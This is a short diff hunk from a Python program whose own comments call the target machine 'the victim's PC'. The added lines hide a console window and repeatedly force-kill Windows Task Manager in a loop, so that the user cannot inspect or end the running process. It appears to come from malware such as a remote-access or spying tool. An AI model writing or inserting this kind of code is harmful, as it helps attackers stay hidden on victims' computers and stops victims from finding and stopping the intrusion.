@@ -25,6 +25,14 @@ def is_connected(): #verify if there is internet on the victim's PC
         pass
     return False
 '''
+
+si = subprocess.STARTUPINFO()
+si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+
+for i in range(0,1000): #kill taskmanager
+  subprocess.call("taskkill /F /IM Taskmgr.exe", startupinfo=si)
+  sleep(1)
+  
 	
 while(True):
 	now = time.time() 
